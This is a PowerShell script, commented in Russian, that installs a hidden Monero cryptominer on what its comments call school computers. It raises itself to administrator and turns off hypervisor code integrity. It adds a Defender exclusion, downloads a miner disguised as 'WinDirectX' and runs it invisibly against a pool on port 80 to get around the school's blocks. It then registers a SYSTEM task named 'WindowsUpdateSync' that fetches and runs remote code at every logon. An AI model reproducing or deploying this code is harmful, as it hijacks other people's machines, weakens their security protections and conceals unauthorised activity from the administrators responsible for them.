# 0. Самовозвышение до Администратора (Лифт)
if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) {
    $arguments = "& '" + $myinvocation.mycommand.definition + "'"
    Start-Process powershell -Verb runAs -ArgumentList $arguments
    Break
}

# --- КОНФИГУРАЦИЯ ---
$path = "C:\ProgramData\SystemLib"
$wallet = "429bPnUKuYBQQVHoap1jKTWwiPfGuKAqL7ggbTFFZdbA3LyKScc6EnP9fTVeig7jNqaF7CFhUk5eCU8S5d85gWqU6Zt6bhA" 
$procName = "WinDirectX"
$exeUrl = "https://github.com/Isfandiyor0112-star/sminers/raw/main/WinDirectX.exe"
$rawScript = "https://raw.githubusercontent.com/Isfandiyor0112-star/sminers/refs/heads/main/win_utility.ps1"

Write-Host "--- ЗАПУСК ПОЛНОЙ СИСТЕМЫ (ПОРТ 80 + АВТОЗАГРУЗКА) ---" -ForegroundColor Cyan

# 1. Очистка старых следов
Stop-Process -Name $procName -Force -ErrorAction SilentlyContinue
Stop-Process -Name "xmrig" -Force -ErrorAction SilentlyContinue

# 2. Оптимизация ядра (чтобы майнило на полную)
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\DeviceGuard\Scenarios\HypervisorEnforcedCodeIntegrity" -Name "Enabled" -Value 0 -ErrorAction SilentlyContinue

# 3. Антивирус и папка
if (!(Test-Path $path)) { New-Item -ItemType Directory -Path $path -Force | Out-Null }
Add-MpPreference -ExclusionPath $path -ErrorAction SilentlyContinue

# 4. Скачивание ядра
try {
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
    Invoke-WebRequest -Uri $exeUrl -OutFile "$path\$procName.exe" -ErrorAction Stop
    Write-Host "[OK] Ядро загружено." -ForegroundColor Green
} catch {
    Write-Host "[!] Ошибка сети!" -ForegroundColor Red; exit
}

# 5. Файл запуска (ПОРТ 80 + ПРЯМОЙ IP ДЛЯ ОБХОДА БЛОКИРОВОК)
# Мы бьем в порт 80, который школа не может закрыть
$cmd = "@echo off`n$path\$procName.exe --title $procName --cpu-priority 1 --cpu-no-yield --cpu-max-threads-hint 50 -o 18.210.126.40:80 -u $wallet -p school_pc --algo rx/0 --donate-level 1"
$cmd | Out-File -FilePath "$path\run_cache.bat" -Encoding ascii
$vbs = "Set WshShell = CreateObject(`"WScript.Shell`")`nWshShell.Run `"$path\run_cache.bat`", 0, False"
$vbs | Out-File -FilePath "$path\win_start.vbs" -Encoding ascii

# 6. Умная Автозагрузка (через Планировщик задач - SYSTEM)
$taskName = "WindowsUpdateSync"
$action = New-ScheduledTaskAction -Execute 'PowerShell.exe' -Argument "-WindowStyle Hidden -Command ""[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; irm '$rawScript' | iex"""
Register-ScheduledTask -Action $action -Trigger (New-ScheduledTaskTrigger -AtLogOn) -TaskName $taskName -User "System" -RunLevel Highest -Force | Out-Null

# 7. Команды управления (check, delete)
$ProfilePath = $PROFILE
if (!(Test-Path $ProfilePath)) { New-Item -Type File -Path $ProfilePath -Force | Out-Null }
$Functions = @"
function check {
    `$p = Get-Process $procName -ErrorAction SilentlyContinue
    if (`$p) { Write-Host "СТАТУС: РАБОТАЕТ" -ForegroundColor Green } else { Write-Host "СТАТУС: ОШИБКА" -ForegroundColor Red }
}
function delete {
    Stop-Process -Name "$procName" -Force -ErrorAction SilentlyContinue
    Unregister-ScheduledTask -TaskName "$taskName" -Confirm:`$false -ErrorAction SilentlyContinue
    Remove-Item -Path "$path" -Recurse -Force -ErrorAction SilentlyContinue
    Clear-Content -Path "`$PROFILE" -ErrorAction SilentlyContinue
    Write-Host "СИСТЕМА УДАЛЕНА" -ForegroundColor Yellow
}
"@
$Functions | Out-File -FilePath $ProfilePath -Force

# 8. Финальный запуск
Start-Process -FilePath "$path\win_start.vbs"
Write-Host "--- ВСЁ ГОТОВО! ПОРТ 80 АКТИВИРОВАН ---" -ForegroundColor Magenta
